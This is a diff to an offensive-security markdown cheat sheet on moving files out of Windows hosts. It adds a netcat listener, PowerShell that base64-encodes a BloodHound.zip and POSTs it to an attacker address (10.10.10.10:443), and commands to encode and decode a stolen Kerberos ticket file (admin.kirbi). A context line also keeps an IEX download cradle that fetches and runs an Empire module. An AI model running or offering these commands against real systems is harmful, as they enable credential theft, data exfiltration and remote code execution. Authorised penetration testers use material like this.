@@ -16,11 +16,22 @@ IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/mod
 
 ### Invoke-WebRequest POST base64 data
 
+`nc -lvnp 443`
+
 `$Base64String = [System.convert]::ToBase64String((Get-Content -Path 'c:/temp/BloodHound.zip' -Encoding Byte))`
 `Invoke-WebRequest -Uri http://10.10.10.10:443 -Method POST -Body $Base64String`
 
 `echo <base64> | base64 -d -w 0 > bloodhound.zip `
 
+### base64 encode/decode
+
+##### encode
+
+`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\TEMP\admin.kirbi"))`
+
+##### decode
+
+`[IO.File]::WriteAllBytes("admin.kirbi", [Convert]::FromBase64String("<base64>"))`
 
 ### download cradles
 
